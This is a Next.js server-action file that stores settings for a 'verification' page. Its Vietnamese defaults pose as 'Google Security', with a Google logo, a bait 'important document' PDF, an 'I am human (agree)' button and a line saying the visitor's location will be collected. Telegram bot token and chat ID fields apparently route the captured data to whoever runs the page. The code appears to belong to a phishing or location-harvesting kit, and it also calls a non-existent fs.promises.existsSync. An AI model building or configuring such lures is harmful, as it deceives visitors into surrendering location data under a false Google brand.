
'use server';

import { promises as fs } from 'fs';
import path from 'path';
import { revalidatePath } from 'next/cache';

const configDir = path.join(process.cwd(), 'src', 'config');
const configPath = path.join(configDir, 'verification.json');

export interface VerificationConfig {
  title: string;
  description: string;
  fileName: string;
  fileInfo: string;
  buttonText: string;
  footerText: string;
  redirectUrl: string;
  imageUrl: string;
  theme: string;
  customHtml?: string;
  tgToken?: string;
  tgChatId?: string;
}

const defaultConfig: VerificationConfig = {
    title: "Bảo mật Google",
    description: "Xác minh thiết bị để tiếp tục truy cập an toàn.",
    fileName: "Tai-lieu-quan-trong.pdf",
    fileInfo: "1.2 MB - Tệp an toàn",
    buttonText: "Tôi là con người (đồng ý)",
    footerText: "Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.",
    redirectUrl: "https://google.com",
    imageUrl: "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png",
    theme: "dark",
    customHtml: "",
    tgToken: "",
    tgChatId: "",
};

export async function getVerificationConfigAction(): Promise<VerificationConfig> {
  try {
    const content = await fs.readFile(configPath, 'utf-8');
    const parsed = JSON.parse(content);
    return { ...defaultConfig, ...parsed };
  } catch (error) {
    try {
      if (!fs.existsSync(configDir)){
          await fs.mkdir(configDir, { recursive: true });
      }
      await fs.writeFile(configPath, JSON.stringify(defaultConfig, null, 2), 'utf-8');
      return defaultConfig;
    } catch (writeError) {
      return defaultConfig;
    }
  }
}

export async function updateVerificationConfigAction(newConfig: VerificationConfig) {
  try {
    await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2), 'utf-8');
    revalidatePath('/');
    return { success: true, message: 'Settings updated successfully.' };
  } catch (error) {
    return { success: false, message: 'Failed to update settings.' };
  }
}
